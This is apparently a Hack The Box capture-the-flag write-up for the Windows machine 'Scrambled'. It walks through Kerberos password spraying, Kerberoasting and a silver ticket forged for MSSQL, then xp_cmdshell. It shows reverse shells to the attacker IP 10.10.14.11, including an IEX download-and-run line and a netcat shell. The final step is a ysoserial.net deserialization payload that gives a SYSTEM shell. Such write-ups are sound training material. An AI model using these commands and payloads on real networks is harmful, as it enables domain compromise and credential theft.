---
title: Scrambled Write-up
date: 2022-10-05 09:00:00 +0200
categories: [Hack The Box, Windows]
tags: [htb, windows, kerberos, silverticket, mssql, deserialization]     # TAG names should always be lowercase
img_path: /assets/img/posts/scrambled/
image:
    path: cover.png
    width: 700
    height: 300
comments: true
toc: true
---

## Enumeration
---

### OS Detection

In order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the `TTL (Time To Live)` of a `ping` response can give us clues. `TTL` will be close to 64 on Unix machines, close to 128 on Windows machines, and close to 255 on Solaris machines.

![Desktop View](ping.png){: w="700" h="400" }
_ping target machine_

We can see that the machine that we are targeting has a TTL of 127, so we guess that we are dealing with a Windows machine.

### Nmap

First, we will start enumerating the open ports on the victim machine. To do that, we will use [nmap](https://github.com/nmap/nmap). We will specify that we want to scan all the port range, that we only want to display the open ports and that we will use the TCP Syn Port Scan scanning method. Optionally, we will specify explicitly that we don't want to perform host discovery and DNS resolution. This will speed up the process. Lastly, we will export all the evidence to a file called `allPorts.txt`:

```bash
nmap -p- -sS --min-rate 5000 -n -Pn -oG allPorts.txt 10.10.11.168
```

```text
# Nmap 7.92 scan initiated Thu Sep 22 13:56:32 2022 as: nmap -p- -sS --min-rate 5000 -n -Pn -oG allPorts.txt 10.10.11.168
Host: 10.10.11.168 ()	Status: Up
Host: 10.10.11.168 ()	Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 1433/open/tcp//ms-sql-s///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 4411/open/tcp//found///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49673/open/tcp/////, 49674/open/tcp/////, 49696/open/tcp/////, 49700/open/tcp/////, 58506/open/tcp/////	Ignored State: filtered (65513)
# Nmap done at Thu Sep 22 13:57:12 2022 -- 1 IP address (1 host up) scanned in 39.63 seconds
```
{: file="enum/access/allPorts"}

Once we know the open ports, we will scan them in a more exhaustive way to find the services and versions that are running. We will export evidence to the `targeted.txt` file:

```bash
nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49696,49700,58506 -sCV -oN targeted.txt 10.10.11.168
```

```text
# Nmap 7.92 scan initiated Thu Sep 22 13:58:00 2022 as: nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49696,49700,58506 -sCV -oN targeted.txt 10.10.11.168
Nmap scan report for 10.10.11.168
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-22 11:58:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-09-22T04:15:16
|_Not valid after:  2052-09-22T04:15:16
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
58506/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.92%I=7%D=9/22%Time=632C4DCE%P=aarch64-unknown-linux-gn
SF:u%r(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V
SF:1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1
SF:D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_O
SF:RDERS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR
SF:_UNKNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")
SF:%r(TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,
SF:"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDE
SF:RS_V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(FourOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_C
SF:OMMAND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UN
SF:KNOWN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\
SF:r\n")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOption
SF:s,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(L
SF:ANDesk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0
SF:\.3;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI
SF:,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_
SF:ORDERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;
SF:\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-time: 
|   date: 2022-09-22T12:00:35
|_  start_date: N/A
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 22 14:01:17 2022 -- 1 IP address (1 host up) scanned in 197.29 seconds
```
{: file="enum/access/targeted"}

This machine has plenty of open ports, but some of them attract our attention. We can see that ports 53 (DNS), 88 (Kerberos), 389 (LDAP) and 445 (SMB) are open. These ports are usually open in DCs (Domain Controllers), so we can take a guess. We can also see that port 4411 is not being identified correctly.

Additionally, we can see how the `LDAP` service leaks the `scrm.local` domain and the   `dc1.scrm.local` `FQDN (Fully Qualified Domain Name)`, which identifies the `DC` in the domain. We will add the `DC's FQDN` to our `/etc/hosts`{: .filepath}, so it points to the target machine's IP.

### Web Server

The first port that we will enumerate is the web `HTTP` server (80), as it usually reveals very useful information and there are plenty of web vulnerabilities.

On the root page of the web server, we will find a section called `IT Services` that contains different articles that describe procedures used in the company. This is very useful information, and sometimes things that seem the most harmless are the ones that provide the most information.

We will see the information that we can retrieve from the different articles:

![Desktop View](web3.png){: w="700" h="400" }
_News Web Server_

There is an alert on the web server that indicates that the company has been security breached and that the `NTLM` authentication has been disabled for the internal network. This seems harmless, but it is always a bad practice to reveal any information about how the internal network of a company is set up. In this case, we can take a guess that the authentication is done via `Kerberos` instead of `NTLM` in the internal network, so we will have it in mind.

![Desktop View](web2.png){: w="700" h="400" }
_User leak_

In the next article, we will see a tutorial on how to get network details in order to contact the technical team of the company. This also seems harmless, but if we take a look at the screenshot, we can see that the `ksimpson` user is being leaked.

![Desktop View](web1.png){: w="700" h="400" }
_DC's FQDN and service port leak_

In the last article, we can see the `FQDN` of the `DC` and the port that an internal tool is using. If we remember the `nmap` enumeration, this was the port that was not being identified correctly. We can guess that this is a port used by a custom internal tool.

### 1st Way: Guessing User and Password

With all the information we have, we can guess that a potential user of the `AD` is `ksimpson`. We can also guess that this user is using a weak password, which is exactly his username.

We can validate these credentials with the [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) tool and using the following command (remember that the `SMB` port is open and that `NTLM` authentication has been disabled, so we have to use `Kerberos` authentication):

```bash
cme smb 10.10.11.168 -k -u 'ksimpson' -p 'ksimpson'
```

So, just guessing, we will have the following correct credentials:

```text
AD -> ksimpson -> ksimpson
```
{: file="enum/access/credentials.txt"}

### 2nd Way: Kerberos Brute-Force

If you are not a guess person, you can always brute-force the `Kerberos` service in order to find users and passwords on the `AD`.

First, we will start enumerating users on the `AD`. In order to do that, we will use the [Kerbrute](https://github.com/ropnop/kerbrute) tool and the `xato-net-10-million-usernames.txt` wordlist from [SecLists](https://github.com/danielmiessler/SecLists):

![Desktop View](userSpray.png){: w="700" h="400" }
_User Enumeration_

We will find the following usernames and we will save them in a file named `users.txt`:

```text
ksimpson
administrator
asmith
jhall
sjenkins
khicks
```
{: file="credentials/access/users.txt"}

Now, we will try to do a password spraying. We will use the `users.txt` file for both users and passwords. As the `Kerbrute` tool only allows testing a single password for a username list, we will use the following `for` in `Bash` to fix this problem:

```bash
for pass in $(cat users.txt); do kerbrute bruteuser -d scrm.local --dc dc1.scrm.local users.txt $pass; done
```

```text

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:15 >  Using KDC(s): [0m
2022/09/22 17:16:15 >  	scrambled.htb:88

2022/09/22 17:16:15 >  [+] VALID LOGIN:	 ksimpson@SCRM.LOCAL:ksimpson
2022/09/22 17:16:15 >  Done! Tested 6 logins (1 successes) in 0.370 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:15 >  Using KDC(s):
2022/09/22 17:16:15 >  	scrambled.htb:88

2022/09/22 17:16:15 >  Done! Tested 6 logins (0 successes) in 0.266 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:15 >  Using KDC(s):
2022/09/22 17:16:15 >  	scrambled.htb:88

2022/09/22 17:16:15 >  Done! Tested 6 logins (0 successes) in 0.242 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:15 >  Using KDC(s):
2022/09/22 17:16:15 >  	scrambled.htb:88

2022/09/22 17:16:16 >  Done! Tested 6 logins (0 successes) in 0.266 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:16 >  Using KDC(s):
2022/09/22 17:16:16 >  	scrambled.htb:88

2022/09/22 17:16:16 >  Done! Tested 6 logins (0 successes) in 0.294 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:16 >  Using KDC(s):
2022/09/22 17:16:16 >  	scrambled.htb:88

2022/09/22 17:16:16 >  Done! Tested 6 logins (0 successes) in 0.264 seconds
```
{: file="credentials/access/spray.txt"}

We will find the following valid credentials:

```text
AD -> ksimpson -> ksimpson
```
{: file="credentials/access/credentials.txt"}

### SMB

If we enumerate the `SMB` service using `impacket-smbclient` with the credentials we have just found, we will find the following:

![Desktop View](smb.png){: w="700" h="400" }
_SMB Client_

We can see a `PDF` named `Network Security Changes.pdf` in the `Public` share. We will download it and proceed to inspect it:

![Desktop View](pdf.png){: w="700" h="400" }
_Network Security Changes.pdf_

This `PDF` reveals some useful information. First, we see the same alert that was present on the web server. This alert basically says that the `NTLM` authentication has been disabled on the network of the company. In the second section of the `PDF` we can see some very interesting information. This section says that an attacker was able to retrieve credentials from the `HR` `SQL` database and that access to the `SQL` service has been removed for everyone apart from the network administrators. So basically, it is giving us a hint saying that we can find credentials in the `SQL` database.

## User Shell
---

With all the information that we have retrieved in the enumeration phase, we will proceed to try to get a shell from the target machine.

### Silver Ticket Attack

At this point, we can use the `impacket-GetUserSPNs` tool to retrieve the `SPNs (Service Principal Names)` and their associated user accounts. `SPNs` are unique identifiers of a service instance and they are used by `Kerberos` to associate a service instance with a service logon account. This tool can also retrieve the `TGS (Ticket Granting Service)`, in a hash format, of the user account associated with a service, and that is what we are going to do now. As we have valid credentials for `Kerberos`, we can try to retrieve the hash of a user account associated with a `SPN`:

![Desktop View](getuserspn.png){: w="700" h="400" }
_GetUserSPNs_

We can see how we have retrieved the hash associated with the `SqlSvc` user that runs the `MSSQLSvc/dc1.scrm.local:1433` SPN. We will crack this hash using [John The Ripper](https://github.com/openwall/john) and the `rockyou.txt` wordlist:

![Desktop View](cracking.png){: w="700" h="400" }
_JTR Cracking_

We will find the following valid credentials:

```text
AD -> sqlsvc -> Pegasus60
```
{: file="credentials/access/credentials.txt"}

It is important to emphasize that these credentials are only going to be useful in their associated service. In this case, the `SqlSvc` user credentials and the `MSSQLSvc/dc1.scrm.local:1433` `SPN`.

With this said, we can try to forge a `Silver Ticket` from the `DC` to access the `MSSQL` service as the `SqlSvc` user. `Silver Tickets` are related to `Golden Tickets` but are more limited in scope. They give attackers access to a single service in an application, instead of all the services in the entire domain, as is the case with `Golden Tickets`. Once we have a ticket, we can use a technique called `PassTheTicket` that allows us to login to a service with a ticket instead of using traditional credentials.

In order to forge a `Silver Ticket`, we will first need to retrieve some information from the domain. First, we will use the following command to get the `Domain SID (Security Identifier)`:

```bash
impacket-getPac -targetUser ksimpson scrm.local/ksimpson:ksimpson
```

![Desktop View](getpac.png){: w="700" h="400" }
_Domain SID_

Once we have the `Domain SID`, we will convert the password that we have cracked to an `NTLM` hash using the following command:

![Desktop View](ntlm.png){: w="700" h="400" }
_Password to NTLM_

Now we have all the information that we need to forge the `Silver Ticket`. We will use `impacket-ticketer` in order to do this:

```bash
impacket-ticketer -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -spn MSSQLSvc/dc1.scrm.local:1433 -domain scrm.local -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 Administrator
```

This command will generate an `Administrator.ccache` file that will correspond to our `Silver Ticket` for the `MSSQL` service as the `SqlSvc` user.

### MSSQL

Once we have the `Silver Ticket`, we will use the following command to do `PassTheTicket` and connect to the `SQL` database of the machine in an interactive session:

```bash
export KRB5CCACHE=Administrator.ccache; impacket-mssqlclient -k dc1.scrm.local
```

Once we are connected, we will list the available databases and tables:

![Desktop View](db1.png){: w="700" h="400" }
_ScrambleHR Database Tables_

We will find an interesting table named `UserImport` in the `ScrambleHR` database. If we recall, it is the database where the `PDF` document stated that the credentials were in. We will enumerate all the columns in this table:

![Desktop View](db2.png){: w="700" h="400" }
_Password in Table_

We can see how we can find some credentials as stated in the `PDF` document.

```text
AD -> MiscSvc -> ScrambledEggs9900
```
{: file="credentials/access/credentials.txt"}

In addition, if we visualize the help panel, we can see that we can activate the `xp_cmdshell` function. This function allows us to execute `cmd` commands in the machine hosting the `SQL` database. We will first activate it and then try the execution of commands:

![Desktop View](db3.png){: w="700" h="400" }
_xp_cmdshell_

### Reverse Shells

#### SQLSvc

Having command execution as the `sqlsvc` user, we will try to send a reverse shell to our machine in order to have a proper shell to operate from.

First, we will host the `nc64.exe` binary with `python3 -m http.server` and then we will download it to the target machine. Additionally, we will listen on port 443 with `rlwrap nc -nlvp 443`. Finally, we will send a reverse shell from the target machine to our machine on port 443 with the `nc64.exe` binary:

![Desktop View](rev1.png){: w="700" h="400" }
_SQLSvc Reverse Shell_

We can see that we have a shell as the `sqlsvc` user.

#### MiscSvc

Having a shell as the `sqlsvc` user to operate as well as the credentials for the `miscsvc` user, we will try to send a reverse shell as the `miscsvc` user to our machine using the `Invoke-PowerShellTcp.ps1` `Powershell` script from [Nishang](https://github.com/samratashok/nishang).

First, we will edit the `Invoke-PowerShellTcp.ps1` script, and we will add the following command at the end of the script. This will have an advantage as we can run the script directly when it is downloaded without having to download it first and then run it. We will indicate that we want a reverse shell, the IP address of our machine, and the port that we want to use (9000):

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 9000
```

We will host this file with `python3 -m http.server`.

Then, on the target machine, we will execute the following commands in order to create secure `PSCredentials` with the password that we have retrieved from the database for the `miscsvc` user:

```powershell
$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc', $SecPassword)
```

Last, we will execute the following command in order to download and execute the `Invoke-PowerShellTcp.ps1` script as the `miscsvc` user with the `PSCredentials` that we have just created. We will be listening in the 9000 port in our machine with `rlwrap nc -nlvp 9000` too:

```powershell
Invoke-Command -Computer dc1 -Credential $Cred -ScriptBlock {IEX(New-Object Net.WebClient).downloadString("http://10.10.14.11:8000/Invoke-PowerShellTcp.ps1")}
```

![Desktop View](rev2.png){: w="700" h="400" }
_MiscSvc Reverse Shell_

We can see that we have a shell as the `miscsvc` user. Now we can proceed to visualize the `user.txt` flag in the `C:\Windows\Users\miscsvc\Desktop\`{: .filepath} directory.

## Administrator Shell
---

Now that we have a shell as the `miscsvc` user, we will proceed to enumerate the target machine in order to gain `Administrator` access.

### Enumeration

It is always important to check the processes that are running on the target machine as they are a very common attack vector in order to gain privileged access. To do this, we will use the following command:

```powershell
Get-Process
```

![Desktop View](privesc1.png){: w="700" h="400" }
_Get-Process_

We can see a process named `ScrambleServer` that will attract our attention. If we remember the enumeration phase, there was a client program that was connecting to the `DC` on port 4411. We can guess that the server behind that client program is this process.

### .Net Reverse Engineering

We know that there is a process called `ScrambleServer`, but where is the client for this server that we have seen on the web server? We will enumerate the machine further and we will find the following files:

![Desktop View](apps.png){: w="700" h="400" }
_EXE and DLL_

If we download the files to our machine and inspect them:

![Desktop View](apps2.png){: w="700" h="400" }
_File type_

We can see that we have a `DLL` file and a `EXE` file, both of them being `PE32` executables.

We will use [ILSpy](https://github.com/icsharpcode/ILSpy) in order to decompile both files and see how they are built and how they run.

If we analyze the code of the binaries, we will find some interesting things in the `ScrambleLib.dll` binary.

![Desktop View](declaration1.png){: w="300" h="100" }
_Request Type Declaration_

We can see that we have a declaration of an enum object populated with functions, named `RequestType`.

![Desktop View](declaration2.png){: w="700" h="400" }
_Message Code Declaration_

This object is used when `UPLOAD_ORDER` is typed in the client application.

![Desktop View](uploadOrder.png){: w="700" h="400" }
_Insecure Deserialization Vulnerability in the Code_

If we analyze the `UploadOrder` function, we can see how it calls a function named `SerializeToBase64`.

We will find the following two functions in the `SalesOrder` class:

![Desktop View](salesorder.png){: w="700" h="400" }
_Insecure Deserialization Vulnerability in the Code_

We can see that these two functions are used to serialize and deserialize data. This type of function should always be reviewed before production because it may pose a security risk. If user data is passed to these functions without being sanitized, it can lead to `RCE (Remote Command Execution)`.

In the `DeserializeFromBase64` function, the user data is passed to the `binaryFormatter.Deserialize` function without being sanitized, and this function is called when the user types `UPLOAD_ORDER + {PAYLOAD}` in the client application. This leads to an `Insecure Deserialization` vulnerability.

### Insecure Deserialization

In order to abuse this `Insecure Deserialization` vulnerability, we can use the [ysoserial.net](https://github.com/pwntester/ysoserial.net) tool. This tool generates a serialized payload that allows you to execute commands when it is deserialized. This tool, in particular, is for `.Net` applications, but there are similar tools for other programming languages too.

We will download the `ysoserial.zip` and transfer it to the target machine:

![Desktop View](ysoserial1.png){: w="700" h="400" }
_ysoserial Transfer_

Now we will extract the `.zip` file with the following command:

```powershell
Expand-Archive ysoserial.zip
```

Once we have the executable file on the target machine. We can execute it setting the formatter to `BinaryFormatter` (remember it was the function being used to deserialize), the `WindowsIdentity` gadget, that we want the payload in `Base64` format (remember the deserialize function received a `Base64` string) and the command that we want to execute (simple `powershell` reverse shell with the `nc.exe` binary we have uploaded previously) :

```powershell
.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\nc.exe -e powershell.exe 10.10.14.11 443"
```

![Desktop View](ysoserial2.png){: w="700" h="400" }
_ysoserial Payload_

Once we have the payload generated, we will copy it. Now we will connect via `nc` to port 4411 on the target machine. Then, we will listen on a port for the reverse shell with `rlwrap nc -nlvp 443`. Last, we will type the following into the `nc` connection:

```bash
UPLOAD_ORDER;{PAYLOAD}
```

![Desktop View](ysoserial3.png){: w="700" h="400" }
_System Reverse Shell_

We can see how we have a shell as the `nt authority\system` user, so we will proceed to visualize the `root.txt` flag in the `C:\Users\Administrator\Desktop`{: .filepath} directory.
